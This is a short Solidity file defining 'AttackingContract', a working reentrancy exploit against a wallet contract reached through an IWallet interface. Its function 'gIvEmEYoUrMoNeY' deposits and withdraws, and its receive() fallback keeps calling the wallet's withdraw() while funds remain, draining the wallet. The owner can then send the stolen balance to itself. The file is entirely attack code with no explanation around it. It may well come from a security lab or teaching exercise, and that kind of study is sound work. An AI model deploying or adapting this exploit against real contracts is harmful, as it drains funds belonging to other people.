// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./IWallet.sol";

contract AttackingContract is Ownable {
    using Address for address payable;

    IWallet private wallet;

    constructor(address _walletAddress) Ownable(msg.sender) {
        wallet = IWallet(_walletAddress);
    }

    function withdraw() external onlyOwner {
        payable(msg.sender).sendValue(address(this).balance);
    }

    function gIvEmEYoUrMoNeY() external payable {
        wallet.deposit{value: msg.value}();
        wallet.withdraw();
    }

    receive() external payable {
        if (address(wallet).balance >= wallet.balances(address(this))) {
            wallet.withdraw();
        }
    }
}